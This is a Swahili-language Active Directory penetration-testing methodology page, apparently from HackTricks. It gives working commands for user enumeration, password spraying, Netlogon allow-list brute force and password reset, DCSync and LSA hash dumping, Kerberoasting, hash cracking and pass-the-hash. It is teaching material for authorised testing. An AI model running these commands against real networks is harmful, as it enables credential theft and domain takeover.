# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari wa msingi

**Active Directory** ni teknolojia ya msingi inayowawezesha **network administrators** kuunda na kusimamia kwa ufanisi **domains**, **users**, na **objects** ndani ya network. Imeundwa ili iweze kupanuka, na kuwezesha upangaji wa idadi kubwa ya users katika **groups** na **subgroups** zinazoweza kusimamiwa, huku ikidhibiti **access rights** katika viwango mbalimbali.

Muundo wa **Active Directory** unajumuisha tabaka tatu kuu: **domains**, **trees**, na **forests**. **Domain** hujumuisha mkusanyiko wa objects, kama vile **users** au **devices**, zinazoshiriki database moja. **Trees** ni makundi ya domains yaliyounganishwa na muundo wa pamoja, na **forest** huwakilisha mkusanyiko wa trees nyingi zilizounganishwa kupitia **trust relationships**, na kuunda tabaka la juu zaidi la muundo wa shirika. **Access** na **communication rights** mahususi zinaweza kuwekwa katika kila mojawapo ya viwango hivi.

Dhana muhimu ndani ya **Active Directory** ni pamoja na:

1. **Directory** – Huhifadhi taarifa zote zinazohusiana na Active Directory objects.
2. **Object** – Hurejelea entities zilizo ndani ya directory, zikiwemo **users**, **groups**, au **shared folders**.
3. **Domain** – Hufanya kazi kama container ya directory objects, huku ikiwa na uwezo wa kuruhusu domains nyingi kuwepo ndani ya **forest**, kila moja ikiwa na mkusanyiko wake wa objects.
4. **Tree** – Kundi la domains zinazoshiriki root domain moja.
5. **Forest** – Kilele cha muundo wa shirika katika Active Directory, kinachoundwa na trees kadhaa zenye **trust relationships** kati yao.

**Active Directory Domain Services (AD DS)** inajumuisha huduma mbalimbali muhimu kwa usimamizi wa kati na mawasiliano ndani ya network. Huduma hizi ni pamoja na:

1. **Domain Services** – Huweka data katikati na kusimamia mwingiliano kati ya **users** na **domains**, ikiwemo utendaji wa **authentication** na **search**.
2. **Certificate Services** – Husimamia uundaji, usambazaji, na usimamizi wa **digital certificates** salama.
3. **Lightweight Directory Services** – Husaidia directory-enabled applications kupitia **LDAP protocol**.
4. **Directory Federation Services** – Hutoa uwezo wa **single-sign-on** wa ku-authenticate users katika web applications nyingi ndani ya session moja.
5. **Rights Management** – Husaidia kulinda copyright material kwa kudhibiti usambazaji na matumizi yake yasiyoidhinishwa.
6. **DNS Service** – Ni muhimu kwa utatuzi wa **domain names**.

Kwa maelezo ya kina zaidi angalia: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili kujifunza jinsi ya **attack an AD**, unahitaji **understand** vizuri sana mchakato wa **Kerberos authentication**.\
[**Soma ukurasa huu ikiwa bado hujui jinsi inavyofanya kazi.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kupata mengi kwenye [https://wadcoms.github.io/](https://wadcoms.github.io) ili kupata muonekano wa haraka wa commands unazoweza kuendesha kwa ajili ya ku-enumerate/ku-exploit AD.

> [!WARNING]
> Mawasiliano ya Kerberos **yanahitaji jina kamili lililohitimu (FQDN)** ili kufanya actions. Ukijaribu kufikia machine kwa kutumia IP address, **itatumia NTLM na si kerberos**.

## Recon Active Directory (No creds/sessions)

Ikiwa una access tu kwenye AD environment lakini huna credentials/sessions, unaweza:

- **Pentest network:**
- Scan network, tafuta machines na open ports, kisha jaribu **ku-exploit vulnerabilities** au **ku-extract credentials** kutoka kwao (kwa mfano, [printers zinaweza kuwa targets zinazovutia sana](ad-information-in-printers.md).
- Ku-enumerate DNS kunaweza kutoa taarifa kuhusu servers muhimu katika domain, kama vile web, printers, shares, vpn, media, na kadhalika.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Angalia [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) ya jumla ili kupata taarifa zaidi kuhusu jinsi ya kufanya hivi.
- **Check for null and Guest access on smb services** (hii haitafanya kazi kwenye matoleo ya kisasa ya Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Mwongozo wa kina zaidi kuhusu jinsi ya ku-enumerate SMB server unaweza kupatikana hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Mwongozo wa kina zaidi kuhusu jinsi ya ku-enumerate LDAP unaweza kupatikana hapa (zingatia **hasa access ya anonymous**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison network**
- Kusanya credentials [**kwa kuiga services ukitumia Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Fikia host kwa [**kutumia relay attack vibaya**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Kusanya credentials kwa **kuweka wazi** [**fake UPnP services ukitumia evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extract usernames/names kutoka kwenye internal documents, social media, services (hasa web) zilizo ndani ya domain environments, na pia kutoka kwenye vyanzo vinavyopatikana hadharani.
- Ukipata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu **username conventions** tofauti za AD (**[soma hii**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Conventions zinazotumika zaidi ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila moja), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi 3 _random_ na nambari 3 _random_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wakati **invalid username inaombwa**, server itajibu kwa kutumia **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, na kutuwezesha kubaini kuwa username hiyo ilikuwa invalid. **Valid usernames** zitaleta ama **TGT katika AS-REP** response au error _KRB5KDC_ERR_PREAUTH_REQUIRED_, inayoonyesha kuwa user anatakiwa kufanya pre-authentication.
- **No Authentication against MS-NRPC**: Kutumia auth-level = 1 (No authentication) dhidi ya MS-NRPC (Netlogon) interface kwenye domain controllers. Njia hii huita function ya `DsrGetDcNameEx2` baada ya ku-bind MS-NRPC interface ili kuangalia kama user au computer ipo bila credentials zozote. Tool ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) hutekeleza aina hii ya enumeration. Utafiti unaweza kupatikana [hapa](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ikiwa umepata mojawapo ya server hizi kwenye mtandao, unaweza pia kufanya **user enumeration dhidi yake**. Kwa mfano, unaweza kutumia tool [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Unaweza kupata orodha za usernames katika [**repo hii ya github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  na hii nyingine ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hata hivyo, unapaswa kuwa na **majina ya watu wanaofanya kazi katika kampuni** kutoka hatua ya recon ambayo ulipaswa kufanya kabla ya hii. Ukiwa na jina na surname, unaweza kutumia script [**namemash.py**](https://gist.github.com/superkojiman/11076951) kutengeneza usernames zinazowezekana kuwa valid.

### Abuse ya allow-list ya vulnerable-channel ya Netlogon (Onelogon)

Hata baada ya **Zerologon** kurekebishwa kwenye DC, akaunti zilizowekwa wazi kwenye allow-list bado zinaweza kuwa katika hatari ya **legacy/vulnerable Netlogon secure-channel behavior**. Configuration yenye hatari ni GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** au registry value inayolingana **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Value hiyo ni **SDDL security descriptor** (tazama [Security Descriptors](security-descriptors.md)). Akaunti au group yoyote iliyopewa ACE inayohusika katika DACL inaweza kulengwa. Kwa mfano, `O:BAG:BAD:(A;;RC;;;WD)` kwa ufanisi huweka **Everyone** kwenye allow-list.

Workflow ya operator kwa vitendo:

1. **Tambua principals walio kwenye allow-list** kwa kukagua **SYSVOL/GPO** na **live DC registry**.
2. **Resolve SIDs** zilizopatikana kwenye SDDL kuwa watumiaji/kompyuta halisi wa AD na uweke kipaumbele kwa **DC machine accounts**, **trust accounts**, na mashine nyingine zenye privileged access.
3. Jaribu mara kwa mara **MS-NRPC / Netlogon authentication** ukitumia akaunti iliyo kwenye allow-list.
4. Baada ya kupata guess iliyofanikiwa, abuse **Netlogon password-setting** ili kuweka upya password ya akaunti inayolengwa (public PoC huiweka kuwa empty string).<sup>[[9]](#references)[[10]](#references)</sup>

Mifano ya haraka ya triage / lab kutoka kwenye public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- **scanner** ni muhimu kwa sababu effective allow-list inaweza kuwa katika **SYSVOL**, kwenye **registry**, au katika sehemu zote mbili.
- Exploit path yenyewe ni muhimu kwa sababu **haihitaji Domain Admin privileges** baada ya account iliyo vulnerable kutambuliwa.
- Ku-compromise **Domain Controller machine account** kama `DC$` ni hatari hasa kwa sababu kubadilisha upya password hiyo kunaweza kuwezesha moja kwa moja njia pana zaidi za **AD takeover**.
- Uwezekano wa **brute-force** unategemea mode: public artifact inaeleza meet-in-the-middle approach, **24-bit** brute force wakati computer account nyingine inapatikana, na **32-bit** variants ambazo ni za polepole zaidi.

Detection / hardening notes:

- Kagua allow-list policy na uondoe kila kitu isipokuwa temporary, explicitly required compatibility exceptions.
- Monitor DC **System** events **5827/5828/5829/5830/5831** ili kugundua vulnerable Netlogon connections zinazokataliwa, kugunduliwa, au kuruhusiwa waziwazi na policy.
- Chukulia accounts zilizo katika `VulnerableChannelAllowList` kuwa **high-risk** hadi legacy dependency iondolewe.

### Kujua username moja au kadhaa

Sawa, unajua tayari una username halali lakini huna passwords... Kisha jaribu:

- [**ASREPRoast**](asreproast.md): Ikiwa user **hana** attribute _DONT_REQ_PREAUTH_ unaweza **ku-request AS_REP message** kwa ajili ya user huyo, ambayo itakuwa na baadhi ya data iliyosimbwa kwa derivation ya password ya user huyo.
- [**Password Spraying**](password-spraying.md): Hebu tujaribu **common passwords** zaidi kwa kila user aliyegunduliwa; huenda user fulani anatumia password dhaifu (zingatia password policy!).
- Kumbuka kwamba unaweza pia **kuspray OWA servers** ili kujaribu kupata access ya mail servers za users.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Huenda ukaweza **kupata** baadhi ya **challenge hashes** za ku-crack kwa **ku-poison** baadhi ya protocols za **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ikiwa umeweza ku-enumerate active directory utakuwa na **emails zaidi na uelewa bora wa network**. Huenda ukaweza kulazimisha [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) za NTLM ili kupata access ya AD env.

### NetExec workspace-driven recon & relay posture checks

- Tumia **`nxcdb` workspaces** kuhifadhi hali ya AD recon kwa kila engagement: `workspace create <name>` huanzisha SQLite DBs za kila protocol chini ya `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Badilisha views kwa `proto smb|mssql|winrm` na uorodheshe secrets zilizokusanywa kwa `creds`. Futa data nyeti manually ukimaliza: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Subnet discovery ya haraka kwa **`netexec smb <cidr>`** huonyesha **domain**, **OS build**, **SMB signing requirements**, na **Null Auth**. Members zinazoonyesha `(signing:False)` zinaweza kuathiriwa na **relay**, huku DCs mara nyingi zikihitaji signing.
- Tengeneza **hostnames katika /etc/hosts** moja kwa moja kutoka kwa NetExec output ili kurahisisha targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wakati **SMB relay to the DC imezuiwa** na signing, bado chunguza hali ya **LDAP**: `netexec ldap <dc>` huonyesha `(signing:None)` / weak channel binding. DC iliyo na SMB signing required lakini LDAP signing ikiwa imezimwa bado ni target inayofaa kwa **relay-to-LDAP** kwa matumizi mabaya kama **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs wakati mwingine **huweka admin passwords zilizofichwa kwenye HTML**. Kuangalia source/devtools kunaweza kufichua maandishi wazi (kwa mfano, `<input value="<password>">`), na kuruhusu Basic-auth access ya kuchanganua/kuchapisha repositories.
- Print jobs zilizopatikana zinaweza kuwa na **plaintext onboarding docs** zenye passwords za kila mtumiaji. Weka pairing zikiwa zimepangiliwa wakati wa testing:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Kuiba NTLM Creds

Ikiwa unaweza **kufikia PCs au shares nyingine** kwa kutumia **null au guest user**, unaweza **kuweka files** (kama SCF file) ambazo zikifikiwa kwa njia fulani zita**trigger NTLM authentication dhidi yako**, hivyo unaweza **kuiba** **NTLM challenge** ili ku-crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** huchukulia kila NT hash uliyonayo tayari kama password candidate ya formats nyingine, zenye kasi ndogo, ambazo key material yake hutokana moja kwa moja na NT hash. Badala ya kubrute-force passphrases ndefu katika Kerberos RC4 tickets, NetNTLM challenges, au cached credentials, unaingiza NT hashes kwenye NT-candidate modes za Hashcat na kuiacha ithibitishe password reuse bila kamwe kujua plaintext. Hii ina nguvu hasa baada ya domain compromise ambapo unaweza ku-harvest maelfu ya NT hashes za sasa na za zamani.<sup>[[5]](#references)</sup>

Tumia shucking wakati:

- Una NT corpus kutoka DCSync, SAM/SECURITY dumps, au credential vaults na unahitaji ku-test reuse katika domains/forests nyingine.
- Unacapture Kerberos material inayotumia RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, au DCC/DCC2 blobs.
- Unataka kuthibitisha haraka reuse ya passphrases ndefu zisizoweza ku-crack na kufanya pivot mara moja kupitia Pass-the-Hash.

Technique hii **haifanyi kazi** dhidi ya encryption types ambazo keys zake si NT hash (kwa mfano, Kerberos etype 17/18 AES). Ikiwa domain inalazimisha AES-only, lazima urudi kwenye regular password modes.

#### Kujenga NT hash corpus

- **DCSync/NTDS** – Tumia `secretsdump.py` pamoja na history ili kupata seti kubwa iwezekanavyo ya NT hashes (na values zake za awali):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries huongeza sana candidate pool kwa sababu Microsoft inaweza kuhifadhi hadi hashes 24 za awali kwa kila account. Kwa njia zaidi za ku-harvest NTDS secrets, angalia:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (au Mimikatz `lsadump::sam /patch`) hutoa local SAM/SECURITY data na cached domain logons (DCC/DCC2). Ondoa duplicates na uongeze hashes hizo kwenye list ileile ya `nt_candidates.txt`.
- **Fuatilia metadata** – Hifadhi username/domain iliyotoa kila hash (hata kama wordlist ina hex pekee). Hashes zinazolingana zitakuonyesha mara moja ni principal gani anayetumia tena password, mara Hashcat inapochapisha candidate iliyoshinda.
- Pendelea candidates kutoka forest ileile au forest inayoaminika; hii huongeza uwezekano wa overlap wakati wa shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **lazima zibaki kama raw 32-hex NT hashes**. Disable rule engines (usiweke `-r`, wala hybrid modes) kwa sababu mangling huharibu candidate key material.
- Modes hizi si lazima ziwe na kasi kubwa zaidi, lakini NTLM keyspace (~30,000 MH/s kwenye M3 Max) ina kasi ya takriban mara 100 kuliko Kerberos RC4 (~300 MH/s). Ku-test NT list iliyochaguliwa ni rahisi zaidi kuliko kuchunguza password space yote katika format yenye kasi ndogo.
- Tumia kila mara **Hashcat build ya hivi karibuni** (`git clone https://github.com/hashcat/hashcat && make install`) kwa sababu modes 31500/31600/35300/35400 zilitolewa hivi karibuni.<sup>[[7]](#references)</sup>
- Kwa sasa hakuna NT mode ya AS-REQ Pre-Auth, na AES etypes (19600/19700) zinahitaji plaintext password kwa sababu keys zake hutokana na PBKDF2 kutoka kwenye passwords za UTF-16LE, si raw NT hashes.

#### Mfano – Kerberoast RC4 (mode 35300)

1. Capture RC4 TGS ya target SPN kwa kutumia low-privileged user (angalia Kerberoast page kwa maelezo):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Fanya shuck ya ticket kwa kutumia NT list yako:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat hutengeneza RC4 key kutoka kwa kila NT candidate na kuthibitisha `$krb5tgs$23$...` blob. Match inathibitisha kuwa service account inatumia mojawapo ya NT hashes zako zilizopo.

3. Fanya pivot mara moja kupitia PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Kwa hiari, unaweza kurejesha plaintext baadaye kwa `hashcat -m 1000 <matched_hash> wordlists/` ikiwa inahitajika.

#### Mfano – Cached credentials (mode 31600)

1. Dump cached logons kutoka kwenye workstation iliyo-compromise:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy DCC2 line ya domain user anayevutia kwenye `dcc2_highpriv.txt` na ufanye shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Match iliyofanikiwa hutoa NT hash ambayo tayari inajulikana kwenye list yako, ikithibitisha kuwa cached user anatumia tena password. Itumie moja kwa moja kwa PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) au i-brute-force katika fast NTLM mode ili kurejesha string.

Workflow hiyo hiyo inatumika kwa NetNTLM challenge-responses (`-m 27000/27100`) na DCC (`-m 31500`). Baada ya match kutambuliwa, unaweza kuanzisha relay, SMB/WMI/WinRM PtH, au ku-crack tena NT hash kwa masks/rules offline.



## Ku-enumerate Active Directory KWA credentials/session

Kwa phase hii unahitaji kuwa **ume-compromise credentials au session ya valid domain account.** Ikiwa una valid credentials au shell kama domain user, **unapaswa kukumbuka kuwa options zilizotolewa hapo awali bado ni options za ku-compromise users wengine**.

Kabla ya kuanza authenticated enumeration, unapaswa kujua **Kerberos double hop problem** ni nini.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Ku-compromise account ni **hatua kubwa ya kuanza ku-compromise domain nzima**, kwa sababu utaweza kuanza **Active Directory Enumeration:**

Kuhusu [**ASREPRoast**](asreproast.md), sasa unaweza kupata kila vulnerable user anayezowezekana, na kuhusu [**Password Spraying**](password-spraying.md) unaweza kupata **list ya usernames zote** na kujaribu password ya compromised account, empty passwords na passwords mpya zenye matumaini.

- Unaweza kutumia [**CMD kufanya basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Unaweza pia kutumia [**powershell kwa recon**](../basic-powershell-for-pentesters/index.html), ambayo itakuwa stealthier
- Unaweza pia [**kutumia powerview**](../basic-powershell-for-pentesters/powerview.md) ili kutoa detailed information zaidi
- Tool nyingine nzuri sana kwa recon katika active directory ni [**BloodHound**](bloodhound.md). **Si stealthy sana** (kulingana na collection methods unazotumia), lakini **ikiwa hujali** hilo, unapaswa kabisa kuijaribu. Tafuta mahali ambapo users wanaweza kutumia RDP, tafuta path ya groups nyingine, na kadhalika.
- **Zana nyingine za automated AD enumeration ni:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records za AD**](ad-dns-records.md), kwa sababu zinaweza kuwa na information inayovutia.
- **Tool yenye GUI** unayoweza kutumia ku-enumerate directory ni **AdExplorer.exe** kutoka kwenye **SysInternal** Suite.
- Unaweza pia kutafuta kwenye LDAP database kwa kutumia **ldapsearch** ili kutafuta credentials katika fields _userPassword_ na _unixUserPassword_, au hata kwenye _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) kwa methods nyingine.
- Ikiwa unatumia **Linux**, unaweza pia ku-enumerate domain kwa kutumia [**pywerview**](https://github.com/the-useless-one/pywerview).
- Unaweza pia kujaribu automated tools kama:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Kutoa domain users wote**

Ni rahisi sana kupata domain usernames zote kutoka Windows (`net user /domain` ,`Get-DomainUser` au `wmic useraccount get name,sid`). Katika Linux, unaweza kutumia: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` au `enum4linux -a -u "user" -p "password" <DC IP>`

> Hata kama sehemu hii ya Enumeration inaonekana fupi, hii ndiyo sehemu muhimu zaidi ya zote. Fungua links (hasa ile ya cmd, powershell, powerview na BloodHound), jifunze jinsi ya ku-enumerate domain na ufanye mazoezi hadi ujisikie comfortable. Wakati wa assessment, huu ndio wakati muhimu wa kupata njia yako kwenda DA au kuamua kuwa hakuna kinachoweza kufanyika.

### Kerberoast

Kerberoasting inahusisha kupata **TGS tickets** zinazotumiwa na services zilizounganishwa na user accounts na ku-crack encryption yake—ambayo inategemea user passwords—**offline**.

Maelezo zaidi kuhusu hili:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Baada ya kupata credentials, unaweza ku-check ikiwa una access ya **machine** yoyote. Kwa hilo, unaweza kutumia **CrackMapExec** kujaribu ku-connect kwenye servers kadhaa kwa kutumia protocols tofauti, kulingana na port scans zako.

### Local Privilege Escalation

Ikiwa ume-compromise credentials au session kama regular domain user na una **access** kwa user huyo kwenye **machine yoyote katika domain**, unapaswa kujaribu kutafuta njia ya **ku-escalate privileges locally na ku-loot credentials**. Hii ni kwa sababu ni kwa local administrator privileges pekee utaweza **ku-dump hashes za users wengine** kwenye memory (LSASS) na locally (SAM).

Kuna page kamili katika kitabu hiki kuhusu [**local privilege escalation katika Windows**](../windows-local-privilege-escalation/index.html) na [**checklist**](../checklist-windows-privilege-escalation.md). Pia, usisahau kutumia [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Ni **unlikely sana** kwamba utapata **tickets** katika current user zinazokupa **permission ya kufikia** resources zisizotarajiwa, lakini unaweza ku-check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ikiwa umeweza ku-enumerate Active Directory, utakuwa na **emails zaidi na uelewa bora wa mtandao**. Huenda ukaweza kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Sasa kwa kuwa una credentials za msingi, unapaswa kuangalia ikiwa unaweza **kupata** **files zozote za kuvutia zinazoshirikiwa ndani ya AD**. Unaweza kufanya hivyo mwenyewe, lakini ni kazi inayochosha na kujirudia sana (hasa ukipata mamia ya docs unazohitaji kukagua).

[**Fuata link hii kujifunza kuhusu tools unazoweza kutumia.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ikiwa unaweza **kufikia PCs au shares nyingine**, unaweza **kuweka files** (kama SCF file) ambazo zikifikiwa kwa njia fulani zita**anzisha NTLM authentication dhidi yako**, ili uweze **kuiba** **NTLM challenge** na ku-crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Vulnerability hii ilimwezesha mtumiaji yeyote aliyethibitishwa **ku-compromise domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Kwa techniques zifuatazo, regular domain user hatoshi; unahitaji privileges/credentials maalum ili kufanya attacks hizi.**

### Hash extraction

Tunatumaini umeweza **ku-compromise** account ya **local admin** kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) pamoja na relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Kisha, ni wakati wa kudump hashes zote zilizo kwenye memory na locally.\
[**Soma page hii kuhusu njia mbalimbali za kupata hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Mara tu unapokuwa na hash ya user**, unaweza kuitumia **ku-impersonate** user huyo.\
Unahitaji kutumia **tool** itakayofanya **NTLM authentication kwa kutumia** **hash** hiyo, **au** unaweza kuunda **sessionlogon** mpya na **ku-inject** **hash** hiyo ndani ya **LSASS**, ili **NTLM authentication inapofanywa**, **hash** hiyo itumike. Chaguo la mwisho ndilo mimikatz hufanya.\
[**Soma page hii kwa maelezo zaidi.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Attack hii inalenga **kutumia NTLM hash ya user kuomba Kerberos tickets**, kama mbadala wa Pass The Hash ya kawaida kupitia NTLM protocol. Kwa hiyo, hii inaweza kuwa **muhimu hasa katika networks ambako NTLM protocol imezimwa** na ni **Kerberos pekee inaruhusiwa** kama authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika mbinu ya **Pass The Ticket (PTT)** attack, attackers **huiba authentication ticket ya user** badala ya password au hash values zake. Ticket hii iliyoibwa hutumiwa **ku-impersonate user huyo**, na kupata access isiyoruhusiwa kwa resources na services ndani ya network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ikiwa una **hash** au **password** ya **local administrato**r, unapaswa kujaribu **ku-login locally** kwenye **PCs** nyingine ukitumia hiyo.
```bash
